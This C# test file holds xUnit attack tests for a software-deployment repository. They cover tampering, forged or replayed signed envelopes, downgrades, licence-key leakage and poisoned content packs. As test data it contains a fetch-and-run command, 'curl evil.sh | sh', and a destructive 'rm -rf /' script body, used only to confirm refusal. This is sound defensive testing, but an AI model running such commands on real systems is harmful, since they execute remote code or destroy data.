using System.Text;
using System.Text.Json;
using Acp.Core.Services;
using Acp.Shared.Deployment;
using Acp.Shared.Distribution;
using Acp.Shared.Enterprise;
using Acp.Shared.Jobs;
using Acp.Shared.ManagementPolicy;
using Acp.Shared.Remediation;
using Acp.Shared.Security;

namespace Acp.Tests;

// RMM-16 DESTRUCTION PASS — hostile attacks on the package
// repository + deployment path. Attacker model: a compromised hub
// (holds no customer key), a poisoned content pack / package
// author, a tampered repository between admission and deploy, a
// curious insider reading listings/audit/logs, and policy games at
// the worst moment. Every attack must refuse with NOTHING executed
// and a chained audit trail — or be recorded as a BREAK in the lane
// ledger with its fix.
//
// D38 fix-lane reconciliations (disclosed, cross-lane): the direct
// automation-envelope mintings below now pass
// DeploymentBinding.AlertConditionId — the RMM-08 lane's D38-F1/F12
// binding (payload v2) binds the alert condition, and the runner's
// synthetic alert carries that condition; minting without it made
// every execution refuse on binding mismatch. Two assertions were
// amended for D38-F5/F10 (marked inline at each site).
public class Rmm16DestructionTests
{
    private static readonly DateTimeOffset T0 = new(2026, 11, 21, 12, 0, 0, TimeSpan.Zero);
    private const string Dev = "dev-1";
    private const string Dev2 = "dev-2";
    private const string Scope = "co-1";
    private const string Group = "grp-bas";
    private const string Secret = Rmm16Tests.LicenceValue;

    private static Rmm16Tests.Rig NewRig() => new();

    private static SignedCommandEnvelope Forge(Rmm16Tests.Rig rig, DeviceIdentity attackerKey,
        string payloadJson, string cls = SignedCommandClasses.PolicyDelivery) =>
        new SignedCommandSigner(attackerKey).Sign(cls,
            Encoding.UTF8.GetBytes(payloadJson), T0, TimeSpan.FromMinutes(5));

    // ---- manifest / component mismatch --------------------------------

    [Fact]
    public void Attack_ComponentSwappedAfterSigning_RefusedAtAdmission()
    {
        var rig = NewRig();
        var pkg = Rmm16Tests.Pkg();
        var signedJson = pkg.ToCanonicalJson();
        // Attacker swaps the install script body inside the signed
        // payload's package but keeps the ORIGINAL manifest: the
        // recomputed manifest no longer agrees.
        var tampered = signedJson.Replace("install-widget 2.0.0", "install-widget 2.0.0 & curl evil.sh | sh");
        Assert.NotEqual(signedJson, tampered);
        var tamperedPkg = DeploymentPackage.FromCanonicalJson(tampered);
        Assert.NotNull(tamperedPkg);
        var (ok, reason) = rig.Repository.Admit(tamperedPkg, pkg.Manifest());
        Assert.False(ok);
        Assert.Contains("does not match its manifest binding", reason);
        Assert.Equal(0, rig.Repository.Count);
    }

    [Fact]
    public void Attack_StepAddedAfterSigning_RefusedAtAdmission()
    {
        var rig = NewRig();
        var pkg = Rmm16Tests.Pkg();
        var smuggled = pkg with
        {
            Install = Rmm16Tests.Def("widget-install-2.0.0",
                RemediationStep.Create("pre", RemediationStepKinds.Wait, argument: "0"),
                RemediationStep.Create("install", RemediationStepKinds.RunScript, scriptBody: "install-widget 2.0.0"),
                RemediationStep.Create("extra", RemediationStepKinds.RunScript, scriptBody: "evil")),
        };
        var (ok, reason) = rig.Repository.Admit(smuggled, pkg.Manifest());
        Assert.False(ok);
        Assert.Contains("manifest", reason);
        Assert.Equal(0, rig.Repository.Count);
    }

    [Fact]
    public void Attack_LicenceBindingMutatedAfterAdmission_RefusedAtDeployTime()
    {
        // Deploy-time re-verification, proven at the runner: a
        // package whose licence binding was mutated after admission
        // (here: re-bound to a different key value's hash) refuses
        // at deploy time because the bound hash no longer agrees
        // with the vault — even when every envelope is genuinely
        // signed for the mutated package. (The repository-store
        // swap path is covered separately: a second Admit of the
        // same id+version with different content refuses —
        // Repository_SameIdVersionDifferentContent_Refused.)
        var rig = NewRig();
        var licPkg = Rmm16Tests.LicensedPkg(rig);
        rig.AdmitAndAssign(licPkg);
        var licMutated = licPkg with
        {
            LicenceKeys = new[] { new PackageLicenceComponent("suite-licence",
                PackageHashing.Sha256Hex("a-different-key-value")) },
        };
        var deploymentId = Guid.NewGuid().ToString("N");
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var envelope = rig.Signer.Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(licMutated, Dev, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var def = DeploymentBinding.DefinitionFor(licMutated, DeploymentActions.Deploy);
        var lib = DeploymentBinding.ExecutionLibrary(licMutated, DeploymentActions.Deploy);
        var auto = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, deploymentId, DeploymentBinding.AlertConditionId)),
            T0, TimeSpan.FromMinutes(5));
        var exec = runner.Run(licMutated, Dev, DeploymentActions.Deploy, false,
            envelope, auto, null, null, () => true, null, null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, exec.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    [Fact]
    public void Attack_FileBytesSwappedInStore_RefusedAtDeployTime()
    {
        var rig = NewRig();
        var good = Encoding.UTF8.GetBytes("genuine-installer");
        var manifest = ContentManifest.Build(good);
        var pkg = Rmm16Tests.Pkg() with
        {
            Files = new[] { new PackageFileComponent("setup.bin", manifest.ContentHash, good.Length, @"C:\Temp\setup.bin") },
        };
        rig.AdmitAndAssign(pkg);
        // The store holds DIFFERENT bytes under a different hash —
        // the package's file component is simply not held verified.
        var evilStore = new PeerContentStore();
        var evilManifest = ContentManifest.Build(Encoding.UTF8.GetBytes("evil-installer!!!"));
        Assert.True(evilStore.PutVerified(evilManifest, Encoding.UTF8.GetBytes("evil-installer!!!")));
        rig.Service.PayloadFetcher = (p, d) => evilStore;
        var result = rig.Service.Deploy("widget", "2.0.0", Dev, T0);
        Assert.False(result.Dispatched);
        Assert.Empty(rig.Executor.Calls);
    }

    // ---- downgrade ------------------------------------------------------

    [Fact]
    public void Attack_DowngradeWithoutDecision_Refused_WithDecisionExecutesAndAudits()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.Pkg(version: "1.0.0"));
        rig.AdmitAndAssign(Rmm16Tests.Pkg(version: "2.0.0"));
        Assert.True(rig.Service.Deploy("widget", "2.0.0", Dev, T0).Dispatched);
        var callsAfterUpgrade = rig.Executor.Calls.Count;

        // AMENDED by the D38 fix lane (F10): assigning 2.0.0
        // superseded the 1.0.0 assignment (one desired version per
        // package), so the downgrade attempt first re-assigns 1.0.0
        // — the deliberate admin act a downgrade-by-policy requires.
        // The downgrade gate itself is what is under attack here.
        rig.Service.Assign("widget", "1.0.0", new[] { Group }, "test-admin");
        var refused = rig.Service.Deploy("widget", "1.0.0", Dev, T0.AddMinutes(1));
        Assert.False(refused.Dispatched);
        Assert.Contains("downgrade", refused.Outcome);
        Assert.Equal(callsAfterUpgrade, rig.Executor.Calls.Count); // nothing ran

        var decided = rig.Service.Deploy("widget", "1.0.0", Dev, T0.AddMinutes(2), downgradeDecidedBy: "admin-1");
        Assert.True(decided.Dispatched, decided.Outcome);
        Assert.Contains(rig.Audit.Entries,
            e => e.Kind == "deployment_downgrade_decided" && e.Actor == "admin-1");
        Assert.Equal("1.0.0", rig.Service.StateFor(Dev, "widget")!.InstalledVersion);
    }

    [Fact]
    public void Attack_RunnerDowngradeCheck_IndependentOfService()
    {
        // Even with a genuine signer, a deployment envelope minted
        // WITHOUT the downgrade bit refuses at the runner when the
        // device already runs a newer version.
        var rig = NewRig();
        var old = rig.AdmitAndAssign(Rmm16Tests.Pkg(version: "1.0.0"));
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var deploymentId = Guid.NewGuid().ToString("N");
        var envelope = rig.Signer.Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(old, Dev, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var def = DeploymentBinding.DefinitionFor(old, DeploymentActions.Deploy);
        var lib = DeploymentBinding.ExecutionLibrary(old, DeploymentActions.Deploy);
        var auto = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, deploymentId, DeploymentBinding.AlertConditionId)),
            T0, TimeSpan.FromMinutes(5));
        var exec = runner.Run(old, Dev, DeploymentActions.Deploy, false,
            envelope, auto, null, null, () => true, installedVersion: "2.0.0", null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, exec.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    // ---- licence-key leakage ----------------------------------------------

    [Fact]
    public void Attack_LicenceKeyLeakage_GrepEveryOutputSurface()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.LicensedPkg(rig));
        var probe = new Rmm16Tests.ProbeExecutor(rig.Executor);
        var svc = new SoftwareDeploymentService(rig.Audit, rig.Policy,
            id => id == Dev ? rig.Facts : null, rig.Signer, rig.Gate,
            rig.Repository, rig.Vault, probe, null, () => rig.Now);
        svc.InstalledVersionProbe = rig.ProbeInstalled;
        svc.Assign("suite", "1.0.0", new[] { Group }, "test-admin");
        Assert.True(svc.Deploy("suite", "1.0.0", Dev, T0).Dispatched);
        Assert.True(svc.Uninstall("suite", Dev, T0.AddMinutes(1)).Dispatched);

        var surfaces = new StringBuilder();
        surfaces.AppendLine(JsonSerializer.Serialize(rig.Repository.Listings()));
        surfaces.AppendLine(string.Join("\n", rig.Audit.Entries.Select(e => $"{e.Kind}|{e.Actor}|{e.Detail}")));
        surfaces.AppendLine(JsonSerializer.Serialize(svc.Executions));
        surfaces.AppendLine(JsonSerializer.Serialize(rig.Repository.All.Select(p => p.ToCanonicalJson())));
        surfaces.AppendLine(string.Join("\n", svc.Journal.Entries.Select(e => e.Detail)));
        Assert.DoesNotContain(Secret, surfaces.ToString());
        // Sanity: the key genuinely flowed to the executor (the grep
        // above is not vacuous — the deployment really consumed it).
        Assert.Contains(Secret, probe.LastScriptBody);
    }

    [Fact]
    public void Attack_LicencePlaceholderForUnboundKey_RefusedAtAdmission()
    {
        var rig = NewRig();
        var hash = rig.Vault.Store("real-key", "some-value");
        var pkg = new DeploymentPackage("smuggler", "1.0.0", "Smuggler", "", true, null,
            Array.Empty<PackageFileComponent>(),
            new[] { new PackageLicenceComponent("real-key", hash) },
            Rmm16Tests.Def("smuggler-install",
                RemediationStep.Create("install", RemediationStepKinds.RunScript,
                    scriptBody: "setup /licence {licence:someone-elses-key}")),
            Rmm16Tests.Def("smuggler-uninstall",
                RemediationStep.Create("u", RemediationStepKinds.UninstallApp, target: "X")));
        var (ok, reason) = rig.Repository.Admit(pkg);
        Assert.False(ok);
        Assert.Contains("does not bind", reason);
    }

    [Fact]
    public void Attack_PackageNamingVaultKeyItDoesNotHold_Refused()
    {
        var rig = NewRig();
        var pkg = Rmm16Tests.Pkg() with
        {
            LicenceKeys = new[] { new PackageLicenceComponent("ghost-key",
                PackageHashing.Sha256Hex("never-stored")) },
        };
        var (ok, reason) = rig.Repository.Admit(pkg);
        Assert.False(ok);
        Assert.Contains("not in the vault", reason);
    }

    // ---- pre/post step smuggling --------------------------------------------

    [Fact]
    public void Attack_PostAdmissionMutationOfCallersLists_ChangesNothingLive()
    {
        var rig = NewRig();
        var steps = new List<RemediationStep>
        {
            RemediationStep.Create("install", RemediationStepKinds.RunScript, scriptBody: "install-widget 2.0.0"),
        };
        var pkg = Rmm16Tests.Pkg() with
        {
            Install = AutomationDefinition.Create("widget-install-2.0.0", "widget-install-2.0.0", steps,
                tier: RemediationTiers.RequiresApproval,
                cooldown: TimeSpan.Zero, maxRunsPerWindow: 10),
        };
        Assert.True(rig.Repository.Admit(pkg).Admitted);
        // Attacker (or buggy caller) mutates the ORIGINAL list after
        // admission — the admitted package must not change.
        steps.Add(RemediationStep.Create("smuggled", RemediationStepKinds.RunScript, scriptBody: "evil"));
        steps[0] = RemediationStep.Create("install", RemediationStepKinds.RunScript, scriptBody: "evil");
        var admitted = rig.Repository.Get("widget", "2.0.0")!;
        Assert.Single(admitted.Install.Steps);
        Assert.Contains("install-widget", admitted.Install.Steps[0].ScriptBody);
    }

    // ---- uninstall forgery -----------------------------------------------------

    [Fact]
    public void Attack_UninstallForNeverDeployedPackage_Refused()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.Pkg());
        var result = rig.Service.Uninstall("widget", Dev, T0);
        Assert.False(result.Dispatched);
        Assert.Contains("never deployed", result.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    [Fact]
    public void Attack_DeployEnvelopeReusedForUninstall_RefusedByBinding()
    {
        var rig = NewRig();
        var pkg = rig.AdmitAndAssign(Rmm16Tests.Pkg());
        Assert.True(rig.Service.Deploy("widget", "2.0.0", Dev, T0).Dispatched);
        var callsAfterDeploy = rig.Executor.Calls.Count;
        // Mint a genuine DEPLOY envelope and present it as an
        // UNINSTALL: the runner's binding names the action.
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var deploymentId = Guid.NewGuid().ToString("N");
        var deployEnvelope = rig.Signer.Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(pkg, Dev, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var def = DeploymentBinding.DefinitionFor(pkg, DeploymentActions.Uninstall);
        var lib = DeploymentBinding.ExecutionLibrary(pkg, DeploymentActions.Uninstall);
        var auto = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, deploymentId, DeploymentBinding.AlertConditionId)),
            T0, TimeSpan.FromMinutes(5));
        var exec = runner.Run(pkg, Dev, DeploymentActions.Uninstall, false,
            deployEnvelope, auto, null, null, () => true, "2.0.0", null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, exec.Outcome);
        Assert.Equal(callsAfterDeploy, rig.Executor.Calls.Count);
    }

    [Fact]
    public void Attack_DoubleUninstall_SecondRefused()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.Pkg());
        Assert.True(rig.Service.Deploy("widget", "2.0.0", Dev, T0).Dispatched);
        Assert.True(rig.Service.Uninstall("widget", Dev, T0.AddMinutes(1)).Dispatched);
        var second = rig.Service.Uninstall("widget", Dev, T0.AddMinutes(2));
        Assert.False(second.Dispatched);
        Assert.Contains("never deployed", second.Outcome);
    }

    // ---- content-pack poisoning ---------------------------------------------------

    [Fact]
    public void Attack_UnsignedContentPack_Refused()
    {
        var rig = NewRig();
        var pack = StarterContentPacks.UtilitiesPack();
        var verdict = rig.Service.ApplySignedContentPack(null);
        Assert.False(verdict.Allowed);
        Assert.Equal(0, rig.Repository.Count);
        var badEnv = new SignedCommandEnvelope(1, SignedCommandClasses.PolicyDelivery, "cust-x",
            T0, T0.AddMinutes(5), "nonce", "hash", "AAAA", "AAAA");
        Assert.False(rig.Service.ApplySignedContentPack(badEnv).Allowed);
        Assert.Equal(0, rig.Repository.Count);
        _ = pack;
    }

    [Fact]
    public void Attack_WrongKeySignedPack_Refused()
    {
        var rig = NewRig();
        var attacker = new DeviceIdentity(new DevOnlyPassThroughProtector());
        var pack = StarterContentPacks.UtilitiesPack();
        var env = Forge(rig, attacker, pack.ToCanonicalJson());
        var verdict = rig.Service.ApplySignedContentPack(env);
        Assert.False(verdict.Allowed);
        Assert.Equal(0, rig.Repository.Count);
    }

    [Fact]
    public void Attack_PackWithSwappedComponent_RefusedWhole_NothingAdmitted()
    {
        var rig = NewRig();
        var good = Rmm16Tests.Pkg(id: "good-one", version: "1.0.0");
        var swapped = Rmm16Tests.Pkg(id: "swapped", version: "1.0.0") with
        {
            LicenceKeys = new[] { new PackageLicenceComponent("ghost",
                PackageHashing.Sha256Hex("not-in-vault")) },
        };
        var pack = new ContentPack("poison-pack", 1, new[] { good, swapped });
        var env = rig.Signer.Sign(SignedCommandClasses.PolicyDelivery,
            Encoding.UTF8.GetBytes(pack.ToCanonicalJson()), T0, TimeSpan.FromMinutes(5));
        var verdict = rig.Service.ApplySignedContentPack(env);
        Assert.False(verdict.Allowed);
        Assert.Equal(0, rig.Repository.Count); // whole-pack: even the good package was NOT admitted
    }

    [Fact]
    public void Attack_PackPayloadTamperedAfterSigning_RefusedByEnvelopeHash()
    {
        var rig = NewRig();
        var pack = StarterContentPacks.UtilitiesPack();
        var env = rig.Signer.Sign(SignedCommandClasses.PolicyDelivery,
            Encoding.UTF8.GetBytes(pack.ToCanonicalJson()), T0, TimeSpan.FromMinutes(5));
        var tamperedJson = pack.ToCanonicalJson().Replace("7zip.7zip", "7zip.evilz");
        var tampered = env with
        {
            PayloadBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(tamperedJson)),
        };
        Assert.False(rig.Service.ApplySignedContentPack(tampered).Allowed);
        Assert.Equal(0, rig.Repository.Count);
    }

    // ---- targeting escape -------------------------------------------------------------

    [Fact]
    public void Attack_TargetingEscape_DeviceOutsideGroup_Refused()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.Pkg()); // assigned to grp-bas; dev-2 is in grp-other
        var result = rig.Service.Deploy("widget", "2.0.0", Dev2, T0);
        Assert.False(result.Dispatched);
        Assert.Contains("target set", result.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    [Fact]
    public void Attack_EnvelopeMintedForAnotherDevice_RefusedAtRunner()
    {
        var rig = NewRig();
        var pkg = rig.AdmitAndAssign(Rmm16Tests.Pkg());
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var deploymentId = Guid.NewGuid().ToString("N");
        var envelope = rig.Signer.Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(pkg, Dev2, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var def = DeploymentBinding.DefinitionFor(pkg, DeploymentActions.Deploy);
        var lib = DeploymentBinding.ExecutionLibrary(pkg, DeploymentActions.Deploy);
        var auto = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, deploymentId, DeploymentBinding.AlertConditionId)),
            T0, TimeSpan.FromMinutes(5));
        var exec = runner.Run(pkg, Dev, DeploymentActions.Deploy, false,
            envelope, auto, null, null, () => true, null, null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, exec.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    // ---- envelope forgery / replay ---------------------------------------------------------

    [Fact]
    public void Attack_ForgedDeploymentEnvelope_WrongKey_Refused()
    {
        var rig = NewRig();
        var pkg = rig.AdmitAndAssign(Rmm16Tests.Pkg());
        var attacker = new DeviceIdentity(new DevOnlyPassThroughProtector());
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var deploymentId = Guid.NewGuid().ToString("N");
        var forged = new SignedCommandSigner(attacker).Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(pkg, Dev, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var exec = runner.Run(pkg, Dev, DeploymentActions.Deploy, false,
            forged, null, null, null, () => true, null, null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, exec.Outcome);
        Assert.Empty(rig.Executor.Calls);
    }

    [Fact]
    public void Attack_ReplayedDeploymentEnvelope_RefusedSecondUse()
    {
        var rig = NewRig();
        rig.AdmitAndAssign(Rmm16Tests.Pkg());
        Assert.True(rig.Service.Deploy("widget", "2.0.0", Dev, T0).Dispatched);
        // The service mints fresh envelopes per dispatch (fresh
        // nonce), so replay is tested at the runner: present the
        // SAME envelope set twice — the gate's nonce guard refuses
        // the second presentation of the automation envelope.
        var pkg = rig.Repository.Get("widget", "2.0.0")!;
        var runner = new DeploymentRunner(rig.Executor, rig.Gate, rig.Audit, rig.Vault);
        var deploymentId = Guid.NewGuid().ToString("N");
        var envelope = rig.Signer.Sign(SignedCommandClasses.PackageDeploy,
            Encoding.UTF8.GetBytes(DeploymentBinding.Payload(pkg, Dev, DeploymentActions.Deploy, false)),
            T0, TimeSpan.FromMinutes(5));
        var def = DeploymentBinding.DefinitionFor(pkg, DeploymentActions.Deploy);
        var lib = DeploymentBinding.ExecutionLibrary(pkg, DeploymentActions.Deploy);
        var auto = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, deploymentId, DeploymentBinding.AlertConditionId)),
            T0, TimeSpan.FromMinutes(5));
        var first = runner.Run(pkg, Dev, DeploymentActions.Deploy, false,
            envelope, auto, null, null, () => true, null, null, deploymentId, T0);
        Assert.Equal(DeploymentOutcomes.Succeeded, first.Outcome);
        var secondId = Guid.NewGuid().ToString("N");
        var auto2 = rig.Signer.Sign(SignedCommandClasses.Automation,
            Encoding.UTF8.GetBytes(RemediationBinding.Payload(def, lib, Dev, secondId)),
            T0, TimeSpan.FromMinutes(5));
        var second = runner.Run(pkg, Dev, DeploymentActions.Deploy, false,
            envelope, auto2, null, null, () => true, null, null, secondId, T0);
        Assert.Equal(DeploymentOutcomes.Refused, second.Outcome); // package_deploy nonce replayed
    }

    // ---- policy games --------------------------------------------------------------------------

    [Fact]
    public void Attack_PolicyKilledMidFlight_AbortsBeforeNextStep()
    {
        var rig = NewRig();
        var pkg = Rmm16Tests.Pkg() with
        {
            Install = Rmm16Tests.Def("widget-install-2.0.0",
                RemediationStep.Create("s1", RemediationStepKinds.RunScript, scriptBody: "one"),
                RemediationStep.Create("s2", RemediationStepKinds.RunScript, scriptBody: "two")),
        };
        rig.AdmitAndAssign(pkg);
        rig.Executor.Hooks["s1"] = () =>
            rig.SetPolicy(DeploymentPolicyKeys.DeploymentEnabled, "false", "kill-1");
        var result = rig.Service.Deploy("widget", "2.0.0", Dev, T0);
        Assert.False(result.Dispatched);
        Assert.Equal(new[] { "s1" }, rig.Executor.Calls.Select(c => c.StepId).ToArray()); // s2 never ran
        // AMENDED by the D38 fix lane (F5): this assertion originally
        // demanded NO state for an aborted deployment — the defect
        // D38-F5 named (s1 executed, the device changed, yet nothing
        // was recorded, so uninstall refused the package as a
        // forgery). The corrected behaviour records the partial
        // deployment; the attack's core claim (s2 never ran, deploy
        // refused) is unchanged.
        var state = rig.Service.StateFor(Dev, "widget");
        Assert.NotNull(state);
        Assert.Equal(DevicePackageState.PartiallyDeployed, state!.Status);
    }

    [Fact]
    public void Attack_UnknownStepKindInPackage_RefusedAtAdmission()
    {
        var rig = NewRig();
        var pkg = Rmm16Tests.Pkg() with
        {
            Install = Rmm16Tests.Def("widget-install-2.0.0",
                RemediationStep.Create("x", "shell", scriptBody: "rm -rf /")),
        };
        // "shell" is not in the closed RMM-08 vocabulary; Create()
        // passes it through and admission must refuse.
        var (ok, reason) = rig.Repository.Admit(pkg);
        Assert.False(ok);
        Assert.Contains("unknown step kind", reason);
    }
}
